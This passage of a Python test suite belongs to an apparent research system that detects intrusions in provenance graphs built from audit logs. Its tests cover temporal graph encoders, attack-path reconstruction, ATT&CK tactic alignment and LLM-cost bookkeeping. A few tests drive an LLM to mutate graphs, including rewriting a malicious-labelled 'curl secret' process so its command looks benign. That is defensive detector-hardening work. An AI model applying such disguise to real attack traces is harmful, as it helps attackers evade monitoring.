            "path": "/tmp/a",
        },
        {
            "actorID": "proc",
            "actor_type": "SUBJECT_PROCESS",
            "objectID": "file",
            "object": "FILE_OBJECT",
            "action": "EVENT_WRITE",
            "timestamp": "1704067200000000000",
            "event_id": "a-source-second",
            "exec": "/bin/sh",
            "path": "/tmp/a",
        },
    ])

    *_unused, graph = handler._build_graph_from_df(frame)

    assert graph.ecount() == 2
    assert graph.es["actions"] == ["EVENT_READ", "EVENT_WRITE"]
    assert graph.es["event_id"] == ["z-source-first", "a-source-second"]
    assert graph.es["event_order"] == [0, 1]


def test_cdm_host_identity_merges_same_scene_shards_and_separates_hosts(tmp_path):
    scene_a = tmp_path / "host-a" / "benign"
    scene_b = tmp_path / "host-b" / "benign"
    scene_a.mkdir(parents=True)
    scene_b.mkdir(parents=True)
    first = cdm_host_identity({}, {}, scene_a / "part-1.json")
    second = cdm_host_identity({}, {}, scene_a / "part-2.json")
    other = cdm_host_identity({}, {}, scene_b / "part-1.json")

    assert first == second == ("scene-dir:host-a", "scene_directory")
    assert other == ("scene-dir:host-b", "scene_directory")


def test_e3_snapshots_keep_interleaved_hosts_separate():
    handler = DARPAHandler.__new__(DARPAHandler)
    handler.all_labels = []
    rows = []
    for host, suffix in (("host-a", "a"), ("host-b", "b")):
        rows.append({
            "actorID": f"proc-{suffix}",
            "actor_type": "SUBJECT_PROCESS",
            "objectID": f"file-{suffix}",
            "object": "FILE_OBJECT",
            "action": "EVENT_WRITE",
            "timestamp": "1704067200000000000",
            "exec": f"cmd-{suffix}",
            "path": f"/tmp/{suffix}",
            "host_id": host,
            "host_id_source": "cdm.hostId",
            "source_scene": "cadets314",
        })
    snapshots = handler.create_snapshots_from_graph(pd.DataFrame(rows), is_malicious=False)

    assert len(snapshots) == 2
    assert {graph["host_id"] for graph in snapshots} == {"host-a", "host-b"}
    for graph in snapshots:
        assert all(
            value.startswith(graph["host_id"] + ":")
            for value in graph.vs["_athena_temporal_id"]
        )


def test_detector_mode_clears_stale_ground_truth_labels():
    g = _Graph([
        _Vertex(name="missed", label=1),
        _Vertex(name="detected", label=0),
    ])

    marked = _mark_detected(g, {"detected"})

    assert marked == 1
    assert g.vs[0].attributes()["label"] == 0
    assert g.vs[1].attributes()["label"] == 1


def test_interpretation_rejects_prediction_without_explicit_held_out_split(tmp_path):
    path = tmp_path / "detections.json"
    path.write_text(json.dumps({
        "dataset": "cadets",
        "scene": None,
        "split": {
            "mode": "date_partition_benign_days_and_attack_days",
            "train_snapshots": [0],
            "test_snapshots": [1],
        },
        "predictions": [{"snapshot": 1, "uuid": "x", "pred_label": 1}],
    }), encoding="utf-8")
    with pytest.raises(RuntimeError, match="explicit train/test"):
        _load_detected_nodes(
            str(path), expected_dataset="cadets", expected_scene=None,
        )


def test_interpretation_accepts_atlas_original_fold_contract(tmp_path):
    path = tmp_path / "atlas_detection.json"
    path.write_text(json.dumps({
        "dataset": "atlas",
        "scene": "S1",
        "split": {
            "mode": ATLAS_SPLIT_MODE,
            "fold": "S1",
            "train_snapshots": [0, 1, 2],
            "test_snapshots": [3],
        },
        "predictions": [
            {"snapshot": 3, "uuid": "attack", "pred_label": 1, "split": "test"},
        ],
    }), encoding="utf-8")

    loaded = _load_detected_nodes(
        str(path), expected_dataset="atlas", expected_scene="S1",
    )

    assert loaded == {3: {"attack"}}


def test_malicious_snapshot_pool_uses_train_indices_only():
    encoder = ATHENAEncoder.__new__(ATHENAEncoder)
    encoder.snapshots = []
    encoder.train_snapshot_indices = [1, 3]
    encoder._mal_ego_pool = []

    # Inspect the implementation contract without constructing igraph objects.
    assert list(encoder.train_snapshot_indices) == [1, 3]


def test_standard_gin_preserves_provenance_direction():
    encoder = GINEncoder(2, 2, 2, num_layers=1, dropout=0.0)
    with torch.no_grad():
        for layer in (encoder.layers[0].mlp.net[0], encoder.layers[0].mlp.net[3]):
            layer.weight.copy_(torch.eye(2))
            layer.bias.zero_()
    x = torch.tensor([[1.0, 0.0], [0.0, 1.0]])
    forward = encoder(x, torch.tensor([[0], [1]]))
    reverse = encoder(x, torch.tensor([[1], [0]]))
    assert not torch.allclose(forward, reverse)


def test_temporal_state_is_committed_explicitly_once():
    temporal = TemporalNodeEncoder(3)
    node_ids = ["same-node"]
    previous = temporal.fetch(node_ids, device=torch.device("cpu"))
    updated = temporal(torch.ones((1, 3)), previous)
    assert temporal.table == {}
    temporal.commit(node_ids, updated)
    assert torch.allclose(temporal.fetch(node_ids, torch.device("cpu")), updated.detach())


def test_attack_embedding_selects_final_malicious_node_state_without_pooling():
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["name"] = ["benign", "attack"]
    graph.vs["label"] = [0, 1]
    encoder = ATHENAEncoder.__new__(ATHENAEncoder)
    encoder.device = torch.device("cpu")
    encoder._build_node_features = lambda _graph: __import__("numpy").zeros((2, 2), dtype="float32")
    encoder._igraph_edges_to_edge_index = lambda _graph: (
        torch.zeros((2, 0), dtype=torch.long), torch.zeros(0, dtype=torch.long),
    )
    encoder._encode_nodes = lambda *_args, **_kwargs: torch.tensor([[1.0, 2.0], [3.0, 4.0]])
    result = encoder._encode_complete_graph(graph)
    assert torch.equal(result, torch.tensor([[3.0, 4.0]]))


def test_encoder_orders_snapshots_by_event_time_not_storage_index():
    graphs = []
    for timestamp in (300.0, 100.0, 200.0):
        graph = ig.Graph(directed=True)
        graph.add_vertex(timestamp=timestamp)
        graphs.append(graph)
    encoder = ATHENAEncoder.__new__(ATHENAEncoder)
    encoder.snapshots = graphs
    assert encoder._chronological_snapshot_ids() == [1, 2, 0]


class _AdditiveTemporal(torch.nn.Module):
    """Small deterministic state cell used to audit split-time behavior."""

    def __init__(self):
        super().__init__()
        self.table = {}

    def reset(self):
        self.table.clear()

    def fetch(self, node_ids, device, table=None):
        source = self.table if table is None else table
        return torch.stack([
            source.get(node_id, torch.zeros(1)).to(device) for node_id in node_ids
        ])

    def forward(self, instantaneous, previous):
        return instantaneous + previous

    def commit(self, node_ids, hidden):
        self.table.update({node_id: hidden[i].detach().cpu() for i, node_id in enumerate(node_ids)})

    def snapshot(self):
        return {key: value.detach().clone() for key, value in self.table.items()}


class _ScaleEncoder(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.scale = torch.nn.Parameter(torch.ones(1))
        self.seen_scales = []

    def forward(self, features, _edge_index, edge_feat=None):
        del edge_feat
        self.seen_scales.append(float(self.scale.detach()))
        return features * self.scale


def _temporal_test_graph(timestamp, values, labels):
    graph = ig.Graph(directed=True)
    graph.add_vertices(len(values))
    graph.vs["name"] = ["shared" if i == 0 else f"node-{i}" for i in range(len(values))]
    graph.vs["_athena_temporal_id"] = list(graph.vs["name"])
    graph.vs["timestamp"] = [float(timestamp)] * len(values)
    graph.vs["x"] = list(values)
    graph.vs["label"] = list(labels)
    return graph


def _minimal_temporal_encoder(graphs, train_ids, test_ids):
    encoder = ATHENAEncoder.__new__(ATHENAEncoder)
    encoder.snapshots = graphs
    encoder.train_snapshot_indices = list(train_ids)
    encoder.test_snapshot_indices = list(test_ids)
    encoder.device = torch.device("cpu")
    encoder.encoder = _ScaleEncoder()
    encoder.temporal = _AdditiveTemporal()
    encoder.use_temporal = True
    encoder.mutation_map = {}
    encoder.grad_clip_norm = 5.0
    encoder._build_node_features = lambda graph: __import__("numpy").asarray(
        graph.vs["x"], dtype="float32",
    ).reshape(-1, 1)
    encoder._igraph_edges_to_edge_index = lambda _graph: (
        torch.zeros((2, 0), dtype=torch.long), torch.zeros(0, dtype=torch.long),
    )
    return encoder


def test_noncontiguous_test_state_does_not_change_saved_train_embeddings():
    graphs = [
        _temporal_test_graph(100, [1.0], [0]),
        _temporal_test_graph(200, [10.0], [1]),
        _temporal_test_graph(300, [100.0], [0]),
    ]
    encoder = _minimal_temporal_encoder(graphs, train_ids=[0, 2], test_ids=[1])

    encoder.generate_node_embeddings(use_temporal=True)

    assert encoder.snapshot_node_embeddings[0]["shared"].item() == pytest.approx(1.0)
    # Train-only state is 1 + 100. It must not include held-out value 10.
    assert encoder.snapshot_node_embeddings[2]["shared"].item() == pytest.approx(101.0)
    # Test is replayed online with only its preceding training history.
    assert encoder.snapshot_node_embeddings[1]["shared"].item() == pytest.approx(11.0)


def test_hcl_attack_negative_retains_its_own_snapshot_time_state():
    graphs = [
        _temporal_test_graph(100, [3.0], [1]),
        _temporal_test_graph(200, [10.0, 2.0], [0, 0]),
    ]
    encoder = _minimal_temporal_encoder(graphs, train_ids=[0, 1], test_ids=[])
    encoder.optimizer = torch.optim.SGD(encoder.encoder.parameters(), lr=0.01)
    captured = {}

    def loss_fn(benign, attacks):
        captured["attacks"] = attacks.detach().clone()
        return benign.mean() * 0.0 + attacks.mean()

    encoder._weighted_contrastive_loss = loss_fn

    encoder._train_one_epoch()

    # The malicious node is encoded at t=100 as 3, not re-encoded after the
    # benign shared node advances the GRU state at t=200.
    assert captured["attacks"].flatten().tolist() == pytest.approx([3.0])
    assert encoder.encoder.scale.grad is not None
    assert abs(float(encoder.encoder.scale.grad)) > 0.0
    # Bank creation, benign pass, and negative replay all precede one update.
    assert set(encoder.encoder.seen_scales) == {1.0}


def test_hcl_positives_are_grouped_within_each_snapshot():
    graphs = [
        _temporal_test_graph(100, [3.0, 4.0, 5.0], [1, 0, 0]),
        _temporal_test_graph(200, [6.0, 7.0], [0, 0]),
    ]
    encoder = _minimal_temporal_encoder(graphs, train_ids=[0, 1], test_ids=[])
    encoder.optimizer = torch.optim.SGD(encoder.encoder.parameters(), lr=0.01)
    positive_batch_sizes = []

    def loss_fn(benign, attacks):
        positive_batch_sizes.append(int(benign.size(0)))
        return benign.mean() * 0.0 + attacks.mean()

    encoder._weighted_contrastive_loss = loss_fn

    encoder._train_one_epoch()

    assert positive_batch_sizes == [2, 2]


def test_two_pass_attack_gradient_matches_small_joint_objective():
    graphs = [
        _temporal_test_graph(100, [3.0], [1]),
        _temporal_test_graph(200, [10.0, 2.0], [0, 0]),
    ]
    encoder = _minimal_temporal_encoder(graphs, train_ids=[0, 1], test_ids=[])
    encoder.optimizer = torch.optim.SGD(encoder.encoder.parameters(), lr=0.0)
    encoder.grad_clip_norm = 1e9
    encoder._weighted_contrastive_loss = lambda benign, attacks: benign.mean() * attacks.mean()

    encoder._train_one_epoch()
    replay_gradient = float(encoder.encoder.scale.grad)

    scale = torch.ones(1, requires_grad=True)
    attack = 3.0 * scale
    # The temporal table is committed detached between snapshots, matching the
    # production encoder's bounded snapshot-state graph.
    benign = torch.stack((10.0 * scale + (3.0 * scale).detach(), 2.0 * scale))
    direct_loss = benign.mean() * attack
    direct_loss.backward()

    assert replay_gradient == pytest.approx(float(scale.grad), rel=1e-6)


def test_attack_paths_connect_malicious_nodes_and_fallback_when_isolated():
    graph = ig.Graph(directed=True)
    graph.add_vertices(4)
    graph.add_edges([(0, 1), (1, 2), (3, 1)])
    graph.es["actions"] = ["a", "b", "c"]
    connected = reconstruct_attack_paths(graph, 0, [0, 2], fallback_hops=2)
    isolated = reconstruct_attack_paths(graph, 3, [3], fallback_hops=1)
    assert [[edge[:3] for edge in path] for path in connected] == [
        [(0, 1, "a"), (1, 2, "b")]
    ]
    assert isolated
    assert all(len(path) <= 1 for path in isolated)


def test_attack_paths_never_reverse_a_peer_to_source_edge():
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.add_edge(1, 0, actions="peer_to_source", timestamp=1.0, event_order=0)

    assert reconstruct_attack_paths(graph, 0, [0, 1], fallback_hops=2) == []


def test_attack_path_enumeration_is_bounded_and_preserves_parallel_event_identity():
    graph = ig.Graph(directed=True)
    graph.add_vertices(3)
    graph.add_edges([(0, 1), (0, 1), (1, 2), (1, 2)])
    graph.es["actions"] = ["read", "read", "write", "write"]
    graph.es["timestamp"] = [1.0, 1.0, 2.0, 2.0]
    graph.es["event_order"] = [0, 1, 2, 3]
    graph.es["event_id"] = ["e0", "e1", "e2", "e3"]

    paths, audit = reconstruct_attack_paths(
        graph,
        0,
        [0, 2],
        max_paths_per_peer=2,
        max_paths_per_alert=2,
        max_expansions_per_alert=100,
        return_audit=True,
    )

    assert len(paths) == 2
    assert audit["truncated"] is True
    assert audit["path_count"] == 2
    assert len({tuple(edge[3] for edge in path) for path in paths}) == 2
    traces = _serialize_causal_paths(paths)
    assert traces[0][0]["event_id"] in {"e0", "e1"}
    assert traces[0][0]["event_order"] in {0, 1}


def test_attack_path_budget_skips_unreachable_peers_before_fair_enumeration():
    graph = ig.Graph(directed=True)
    graph.add_vertices(4)
    graph.add_edges([(0, 3), (3, 2)])
    graph.es["actions"] = ["first", "second"]
    graph.es["timestamp"] = [1.0, 2.0]
    graph.es["event_order"] = [0, 1]
    graph.es["event_id"] = ["e0", "e1"]

    paths, audit = reconstruct_attack_paths(
        graph,
        0,
        [0, 1, 2],
        max_paths_per_peer=1,
        max_paths_per_alert=1,
        max_expansions_per_alert=4,
        return_audit=True,
    )

    assert len(paths) == 1
    assert audit["processed_peers"] == [2]
    assert audit["skipped_unreachable_peers"] == [1]
    assert audit["skipped_budget_peers"] == []


def test_persistent_tactic_queues_are_isolated_for_interleaved_hosts():
    queues = HostTacticQueues(
        retention_seconds=3600,
        top_k=3,
        min_ratio=1.0,
        library=[["Initial Access", "Execution"]],
    )
    first_a = queues.append("host-a", {
        "timestamp": 1.0,
        "candidates": [{"tactics": ["Initial Access"], "score": 0.9}],
    })
    first_b = queues.append("host-b", {
        "timestamp": 2.0,
        "candidates": [{"tactics": ["Discovery"], "score": 0.9}],
    })
    second_a = queues.append("host-a", {
        "timestamp": 3.0,
        "candidates": [{"tactics": ["Execution"], "score": 0.9}],
    })

    assert first_a["host_id"] == "host-a"
    assert first_b["passes_lcs_filter"] is False
    assert second_a["passes_lcs_filter"] is True
    assert {host: len(rows) for host, rows in queues.rows().items()} == {
        "host-a": 2,
        "host-b": 1,
    }


def test_attack_sequence_records_require_source_provenance(tmp_path):
    valid = tmp_path / "verified.jsonl"
    valid.write_text(json.dumps({
        "source_id": "cti-record-17",
        "source_record": "corpus/export.json#17",
        "source_hash": "a" * 64,
        "source_corpus": "author-supplied-cti-export",
        "techniques": ["T1189", "T1059.003"],
    }) + "\n", encoding="utf-8")
    assert load_technique_sequence_records(str(valid))[0]["source_id"] == "cti-record-17"

    invalid = tmp_path / "unbound.jsonl"
    invalid.write_text(json.dumps({"techniques": ["T1189"]}) + "\n", encoding="utf-8")
    with pytest.raises(ValueError, match="source_id"):
        load_technique_sequence_records(str(invalid))


def test_official_attackseqbench_derivative_has_408_hashed_records():
    path = Path("data/attack_knowledge/attackseqbench/verified_sequences.jsonl")
    records = load_technique_sequence_records(str(path))
    assert len(records) == 408
    assert records[0]["source_id"] == "attackseqbench-grouped-0001"
    assert records[-1]["source_id"] == "attackseqbench-grouped-0408"
    manifest = json.loads(path.with_name("content_manifest.json").read_text(encoding="utf-8"))
    expected = _content_manifest(records)
    assert manifest["records"] == expected["records"]
    assert manifest["aggregate_sha256"] == expected["aggregate_sha256"]
    assert len(manifest["records"]) == 408
    assert all(len(row["derived_sha256"]) == 64 for row in manifest["records"])
    archive = Path("/tmp/AttackSeqBench.zip")
    if archive.exists():
        assert attackseq_sha256(archive) == manifest["retrieval"]["archive_sha256"]


def test_official_attackseqbench_loader_preserves_all_record_local_tactics():
    path = Path("data/attack_knowledge/attackseqbench/verified_sequences.jsonl")
    bundled = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
    loaded = load_tactic_sequence_records(str(path))
    assert len(loaded) == 408
    assert [row["tactics"] for row in loaded] == [row["tactics"] for row in bundled]


def test_attackseq_content_manifest_detects_derived_tactic_tampering():
    path = Path("data/attack_knowledge/attackseqbench/verified_sequences.jsonl")
    records = load_technique_sequence_records(str(path))
    baseline = _content_manifest(records)
    records[0] = {**records[0], "tactics": ["Impact"]}
    tampered = _content_manifest(records)
    assert tampered["records"][0]["derived_sha256"] != baseline["records"][0]["derived_sha256"]
    assert tampered["aggregate_sha256"] != baseline["aggregate_sha256"]


def test_attackseqbench_raw_conversion_is_deterministic(tmp_path):
    grouped = tmp_path / "question_generation" / "grouped_attackseqs"
    grouped.mkdir(parents=True)
    payload = {
        "file_name": "record title", "tactic_label": True, "technique_label": True,
        "triplet_groups": {
            "Execution": {"T1059-Command and Scripting Interpreter": []},
            "Discovery": {"T1082-System Information Discovery": []},
        },
    }
    (grouped / "2.json").write_text(json.dumps(payload), encoding="utf-8")
    (grouped / "1.json").write_text(json.dumps(payload), encoding="utf-8")
    retrieval_hash = "b" * 64
    first = convert_grouped_attackseqs(tmp_path, retrieval_hash)
    second = convert_grouped_attackseqs(tmp_path, retrieval_hash)
    assert first == second
    assert [row["source_id"] for row in first] == [
        "attackseqbench-grouped-0001", "attackseqbench-grouped-0002",
    ]
    assert first[0]["techniques"] == ["T1059", "T1082"]


def test_top_k_tactic_candidate_chains_are_all_aligned():
    queue = [
        {"candidates": [
            {"tactic": "Initial Access", "score": 0.9},
            {"tactic": "Execution", "score": 0.8},
        ]},
        {"candidates": [
            {"tactic": "Execution", "score": 0.9},
            {"tactic": "Discovery", "score": 0.7},
        ]},
    ]
    candidates = build_candidate_tactic_chains(queue, top_k=3)
    aligned = align_candidate_chains(
        candidates,
        [["Initial Access", "Execution"], ["Execution", "Discovery"]],
        min_ratio=0.6,
        top_k=3,
    )
    assert len(candidates) == 3
    assert len(aligned) == 3
    assert aligned[0]["passes_threshold"] is True


def test_alignment_output_retains_attack_sequence_source_provenance():
    aligned = align_candidate_chains(
        [{"tactics": ["Execution", "Discovery"], "semantic_score": 1.0}],
        [{
            "tactics": ["Execution", "Discovery"], "source_id": "r1",
            "source_record": "export.json#1", "source_hash": "b" * 64,
            "source_corpus": "verified-export",
        }],
        min_ratio=0.6,
        top_k=1,
    )
    assert aligned[0]["library_source"]["source_id"] == "r1"


def test_edge_mutation_requires_one_legal_action_per_candidate():
    payload = json.dumps([
        {"edge_id": 0, "action": "KEEP"},
        {"edge_id": 1, "action": "ADD"},
    ])
    assert _parse_llm_response(payload, num_remove=1, num_add=1) == ["KEEP", "ADD"]
    with pytest.raises(ValueError):
        _parse_llm_response('[{"edge_id": 0, "action": "KEEP"}]', 1, 1)
    with pytest.raises(ValueError):
        _parse_llm_response(json.dumps([
            {"edge_id": 0, "action": "KEEP"},
            {"edge_id": 1, "action": "DROP"},
        ]), 1, 1)


def test_edge_mutation_batches_large_properties_within_prompt_budget():
    graph = ig.Graph(directed=True)
    graph.add_vertices(4)
    graph.vs["type"] = ["process", "file", "file", "file"]
    graph.vs["properties"] = [
        "worker --safe,1,/bin/worker",
        *("/tmp/" + "x" * 5000 + str(index) for index in range(3)),
    ]
    graph.vs["_athena_boundary_context"] = [False, True, True, True]
    graph.add_edge(0, 1, actions="read")
    calls = []

    def fake_llm(prompt, **metadata):
        calls.append((prompt, metadata))
        return json.dumps([
            {"edge_id": index, "action": "KEEP"}
            for index in range(metadata["candidate_count"])
        ])

    mutated, actions = apply_edge_mutation_llm(
        graph,
        {0},
        llm_fn=fake_llm,
        max_add_candidates=8,
        max_candidates_per_call=8,
        max_prompt_chars=2400,
    )

    assert mutated is not None
    assert len(actions) == 6
    assert len(calls) > 1
    assert all(len(prompt) <= 2400 for prompt, _metadata in calls)
    assert sum(metadata["candidate_count"] for _prompt, metadata in calls) == len(actions)
    assert all(metadata["prompt_chars"] <= metadata["prompt_char_budget"] for _p, metadata in calls)


def test_semantic_prompt_truncation_is_recorded_and_bounded():
    graph = ig.Graph(directed=True)
    graph.add_vertices(9)
    graph.vs["type"] = ["process"] * 9
    graph.vs["properties"] = ["curl secret,1,/bin/curl"] + [
        f"helper{index} safe,2,/bin/helper{index}" for index in range(8)
    ]
    graph.vs["label"] = [1] + [0] * 8
    graph.vs["_athena_boundary_context"] = [False] + [True] * 8
    graph.add_edges([(index, 0) for index in range(1, 9)])
    graph.es["actions"] = ["read"] * 8
    calls = []

    def fake_llm(prompt, **metadata):
        calls.append((prompt, metadata))
        return '{"new_command_name":"wget","new_arguments":"secret"}'

    mutated = apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"curl", "wget"},
        benign_args={"safe"},
        llm_fn=fake_llm,
        max_prompt_chars=1900,
    )

    assert mutated is not None
    assert len(calls) == 1
    prompt, metadata = calls[0]
    assert len(prompt) <= 1900
    assert metadata["context_truncated"] is True
    assert metadata["context_triples_used"] < metadata["context_triples_total"]


def test_per_model_llm_routing_records_usage_latency_retry_and_cost(monkeypatch):
    import src.utils.llm as llm_module

    monkeypatch.setenv("ATHENA_TEST_API_KEY", "secret")
    calls = {"count": 0}

    def fake_chat(**kwargs):
        calls["count"] += 1
        assert kwargs["endpoint"] == "https://provider.example/v1/chat/completions"
        assert kwargs["model"] == "served-test-model"
        if calls["count"] == 1:
            raise RuntimeError("transient")
        return '{"ok":true}', {"prompt_tokens": 120, "completion_tokens": 30}

    monkeypatch.setattr(llm_module, "chatanywhere_summarize", fake_chat)
    client = _build_llm_fn("test", {
        "provider": "test-provider",
        "base_url": "https://provider.example/v1",
        "api_key_env": "ATHENA_TEST_API_KEY",
        "served_model": "served-test-model",
        "temperature": 0.2,
        "top_p": 0.95,
        "mutation_max_tokens": 128,
        "max_api_retries": 1,
    })

    assert client("prompt", stage="edge_mutation", attempt=2) == '{"ok":true}'
    record = client.records[0]
    assert record["stage"] == "edge_mutation"
    assert record["attempt"] == 2
    assert record["retry"] == 1
    assert record["provider"] == "test-provider"
    assert record["input_tokens"] == 120
    assert record["output_tokens"] == 30
    assert record["api_retries"] == 1
    assert record["wall_latency_seconds"] >= 0

    summary = summarize_llm_calls(client.records, {
        "served-test-model": {
            "input_per_million_usd": 2.0,
            "output_per_million_usd": 4.0,
        }
    })
    assert summary["cost"]["cost_usd"] == pytest.approx((120 * 2 + 30 * 4) / 1_000_000)
    assert summary["cost"]["fully_recalculable"] is True


def test_llm_context_budget_rejects_before_api_and_records_failure(monkeypatch):
    import src.utils.llm as llm_module

    called = {"value": False}
    monkeypatch.setattr(
        llm_module,
        "chatanywhere_summarize",
        lambda **_kwargs: called.__setitem__("value", True),
    )
    client = _build_llm_fn("bounded", {
        "provider": "local-vllm",
        "base_url": "http://127.0.0.1:8000/v1",
        "api_key_optional": True,
        "served_model": "bounded-model",
        "mutation_max_tokens": 1024,
        "context_window": 1100,
    })

    with pytest.raises(ValueError, match="context budget"):
        client("x" * 300, stage="semantic_mutation", attempt=1)

    assert called["value"] is False
    assert client.records[0]["status"] == "error"
    assert client.records[0]["api_attempts"] == 0


def test_deepseek_v3_endpoint_and_model_are_explicitly_resolved(monkeypatch):
    monkeypatch.setenv("DEEPSEEK_API_KEY", "secret")
    monkeypatch.setenv("DEEPSEEK_V3_BASE_URL", "https://v3.example/v1")
    monkeypatch.setenv("DEEPSEEK_V3_MODEL_ID", "deepseek-v3-0324-pinned")
    client = _build_llm_fn("deepseek-v3", {
        "provider": "deepseek",
        "base_url_env": "DEEPSEEK_V3_BASE_URL",
        "api_key_env": "DEEPSEEK_API_KEY",
        "served_model_env": "DEEPSEEK_V3_MODEL_ID",
        "mutation_max_tokens": 1024,
        "context_window": 4096,
    })
    assert client.model == "deepseek-v3-0324-pinned"
    assert client.endpoint == "https://v3.example/v1/chat/completions"


def test_cost_recalculation_uses_manifest_resolved_model(tmp_path, capsys):
    manifest_path = tmp_path / "manifest.json"
    manifest_path.write_text(json.dumps({
        "llm": "deepseek-v3",
        "llm_config": {"resolved_model": "deepseek-v3-0324-pinned"},
        "llm_calls": [{
            "model": "deepseek-v3-0324-pinned", "input_tokens": 100,
            "output_tokens": 50,
        }],
    }), encoding="utf-8")
    assert recalculate_llm_cost_main(["--manifest", str(manifest_path)]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["priced_calls"] == 1


def test_mmd_permutation_statistic_is_deterministic():
    reference = np.asarray([[0.0, 0.0], [0.1, 0.0], [0.0, 0.1]])
    variant = np.asarray([[1.0, 1.0], [1.1, 1.0], [1.0, 1.1]])
    first = permutation_mmd(reference, variant, permutations=99, seed=17)
    second = permutation_mmd(reference, variant, permutations=99, seed=17)
    assert first == second
    assert first["mmd2"] > 0
    assert 0 < first["p_value"] <= 1


def test_validator_direct_script_cli_help_runs_from_repo_root():
    result = subprocess.run(
        [sys.executable, "scripts/validate_artifact.py", "--help"],
        check=False, capture_output=True, text=True,
    )
    assert result.returncode == 0, result.stderr


def test_table_vii_mapping_scorer_separates_acc_ste_cte_and_unmapped():
    truth = [{
        "record_type": "mapping",
        "source_id": "gt1", "dataset": "cadets", "scene": "cadets314",
        "host_id": "h1", "uuid": "node-1",
        "boundary": {"snapshot": 7, "event_id": "event-1"},
        "reference_technique": "T1082.001", "reference_tactic": "Discovery",
    }]
    interps = []
    for variant in ("direct", "tech-enhanced", "log-enhanced", "full-enhanced"):
        interps.append({
            "dataset": "cadets", "scene": "cadets314", "mapping_variant": variant,
            "final_mapping_predictions": [{
                "source_scene": "cadets314", "host_id": "h1", "anchor_uuid": "node-1",
                "boundary_snapshot": 7, "boundary_event_id": "event-1",
                "top_k_candidates": [
                    {"technique": "T1057.002", "tactics": ["Discovery"]},
                    {"technique": "T1082.999", "tactics": ["Discovery"]},
                ],
                "unmapped_reason": None,
            }],
            "per_attack_subgraph": [{
                "source_scene": "cadets314", "host_id": "h1", "uuid": "unregistered-fp",
                "snapshot_time": 200.0,
                "top_k_candidates": [
                    {"technique": "T9999", "tactics": ["Impact"]},
                ],
            }],
            "final_detection_decisions": [],
        })
    result = score_interpretation(interps, truth)
    variants = result["table_vii_mapping"]["variants"]
    assert all(variants[name]["1"]["STE"] == 1 for name in variants)
    assert all(variants[name]["3"]["Acc"] == 1 for name in variants)


def test_table_vii_exact_key_allows_same_anchor_at_distinct_events_and_rejects_detector_miss():
    truth = [{
        "record_type": "mapping", "source_id": f"gt-{event}",
        "dataset": "cadets", "scene": "cadets314", "host_id": "h1",
        "anchor_uuid": "same-node", "boundary": {"snapshot": snapshot, "event_id": event},
        "reference_technique": "T1082", "reference_tactic": "Discovery",
    } for snapshot, event in ((7, "event-1"), (8, "event-2"))]
    interps = []
    for variant in ("direct", "tech-enhanced", "log-enhanced", "full-enhanced"):
        interps.append({
            "dataset": "cadets", "scene": "cadets314", "mapping_variant": variant,
            "final_mapping_predictions": [{
                "source_scene": "cadets314", "host_id": "h1", "anchor_uuid": "same-node",
                "boundary_snapshot": snapshot, "boundary_event_id": event,
                "top_k_candidates": [{"technique": "T1082", "tactics": ["Discovery"]}],
                "unmapped_reason": None,
            } for snapshot, event in ((7, "event-1"), (8, "event-2"))],
        })
    result = score_interpretation(interps, truth)
    assert result["table_vii_mapping"]["variants"]["direct"]["1"]["Acc"] == 2
    interps[0]["final_mapping_predictions"][0].update({
        "top_k_candidates": [], "unmapped_reason": "detector_miss",
    })
    with pytest.raises(ValueError, match="not emitted by the detector"):
        score_interpretation(interps, truth)


def test_table_vii_variants_switch_both_technique_and_log_enhancement():
    assert _mapping_variant_settings("direct") == ("technique_triples_raw.json", False)
    assert _mapping_variant_settings("tech-enhanced") == (
        "technique_triples_transformed.json", False,
    )
    assert _mapping_variant_settings("log-enhanced") == (
        "technique_triples_raw.json", True,
    )
    assert _mapping_variant_settings("full-enhanced") == (
        "technique_triples_transformed.json", True,
    )


def test_every_mapping_variant_must_bind_the_scored_registry_hash():
    digest = "a" * 64
    rows = [{
        "mapping_variant": variant,
        "attack_event_boundaries": {"sha256": digest},
    } for variant in ("direct", "tech-enhanced", "log-enhanced", "full-enhanced")]
    validate_registry_bindings(rows, [], digest)
    rows[1]["attack_event_boundaries"]["sha256"] = "b" * 64
    with pytest.raises(ValueError, match="not bound"):
        validate_registry_bindings(rows, [], digest)


def test_mapping_registry_scene_filter_and_exact_event_hash_join(tmp_path):
    graphs = []
    for scene, event_id in (("S1", "event-s1"), ("S2", "event-s2")):
        graph = ig.Graph(directed=True)
        graph.add_vertices(2)
        graph.vs["name"] = [f"anchor-{scene}", f"object-{scene}"]
        graph.vs["label"] = [1, 0]
        graph.add_edge(0, 1, actions="write", timestamp=100.0, event_id=event_id, event_order=0)
        graph["host_id"], graph["source_scene"] = "h1", scene
        graphs.append(graph)
    source = tmp_path / "source.json"
    source.write_text("{}\n", encoding="utf-8")
    registry = tmp_path / "registry.jsonl"
    rows = []
    for snapshot, (scene, event_id) in enumerate((("S1", "event-s1"), ("S2", "event-s2"))):
        rows.append({
            "record_type": "mapping", "dataset": "atlas", "scene": scene,
            "source_id": f"mapping-{scene}", "source_corpus": "fixture",
            "source_record": str(source), "source_hash": attackseq_sha256(source),
            "host_id": "h1", "anchor_uuid": f"anchor-{scene}",
            "boundary": {"snapshot": snapshot, "event_id": event_id,
                         "anchor": f"anchor-{scene}",
                         "event_sha256": event_sha256(graphs[snapshot], 0)},
        })
    registry.write_text("\n".join(json.dumps(row) for row in rows) + "\n", encoding="utf-8")
    handler = SimpleNamespace(snapshots=graphs)
    resolved = _resolve_mapping_registry(registry, handler, "atlas", "S1")
    assert [row["scene"] for row in resolved] == ["S1"]
    rows[0]["boundary"]["event_sha256"] = "0" * 64
    registry.write_text("\n".join(json.dumps(row) for row in rows) + "\n", encoding="utf-8")
    with pytest.raises(RuntimeError, match="hashed audit event"):
        _resolve_mapping_registry(registry, handler, "atlas", "S1")


def test_registered_predictions_commit_by_exact_same_minute_event_order():
    graph = ig.Graph(directed=True)
    graph.add_vertices(4)
    graph.vs["name"] = ["p-late", "p-early", "f1", "f2"]
    graph.add_edge(0, 2, actions="write", timestamp=100.0, event_id="late", event_order=1)
    graph.add_edge(1, 3, actions="write", timestamp=100.0, event_id="early", event_order=0)
    positions = [(100.0, 1, 0, 0), (100.0, 0, 0, 1)]
    work = sorted(
